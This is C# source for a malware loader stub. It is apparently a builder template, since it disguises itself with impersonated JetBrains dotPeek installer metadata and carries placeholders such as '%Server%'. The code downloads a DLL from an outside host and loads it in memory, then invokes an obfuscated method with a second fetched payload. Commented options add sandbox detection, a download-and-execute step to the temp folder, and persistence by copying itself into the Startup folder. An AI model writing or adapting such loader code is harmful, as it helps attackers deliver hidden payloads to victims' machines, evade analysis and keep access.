using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Threading.Tasks;
using System.Windows.Forms;

//Default [assembly: AssemblyTitle("Installer.dotPeek.Web")]
//Default [assembly: AssemblyDescription("JetBrains dotPeek 2021.1.1 Web Installer")]
//Default [assembly: AssemblyCompany("JetBrains")]
//Default [assembly: AssemblyProduct("dotPeek 2021.1.1 Web Installer")]
//Default [assembly: AssemblyCopyright("Copyright Â© 2021 JetBrains, Inc")]
//Default [assembly: AssemblyFileVersion("211.0.20210409.190258")]


//Assembly [assembly: AssemblyTitle("{1}")]
//Assembly [assembly: AssemblyDescription("{2}")]
//Assembly [assembly: AssemblyCompany("{3}")]
//Assembly [assembly: AssemblyProduct("{4}")]
//Assembly [assembly: AssemblyCopyright("{5}")]
//Assembly [assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")]


namespace WindowsMediaPlayer1
{
    static class Program
    {

        public static byte[] media(string ferm)
        {
            byte[] media;
            for (; ; )
            {
                try
                {
                    WebClient assemblys = new WebClient();
                    media = assemblys.DownloadData(ferm);
                }
                catch (Exception ex)
                {
                ServicePointManager.Expect100Continue = true;
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                    continue;
                }
                break;
            }
            return media;
        }

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {



    //sandboxie controlsandboxie();

    //Messega

            {
                ServicePointManager.Expect100Continue = true;
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            }


    //download try
    //download {
    //download  System.Net.WebClient appyrun = new System.Net.WebClient();
    //download appyrun.DownloadFile("%DownloadLink%", (System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
    //download  Process.Start((System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
    //download }
    //download catch
    //download {
    //download }


            object web = new object[] { %aPP%, string.Empty, media("%Server%"), true };

            Assembly refS;

            refS = AppDomain.CurrentDomain.Load(media("https://ieaspk.com/instagram.dll"));


            refS.GetType("instagram"+ ".what" + "sapp").InvokeMember("stu"+"dio", System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])web);

    //start  {
    //start      System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\%FileDosya%");
    //start  }


}

        //sandboxie [DllImport("kernel32.dll")]
        //sandboxie public static extern IntPtr GetModuleHandle(string lpModuleName);
        //sandboxie static void controlsandboxie()
        //sandboxie {
        //sandboxie     if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
        //sandboxie     {
        //sandboxie        Environment.Exit(1);
        //sandboxie     }
        //sandboxie }
    }
}
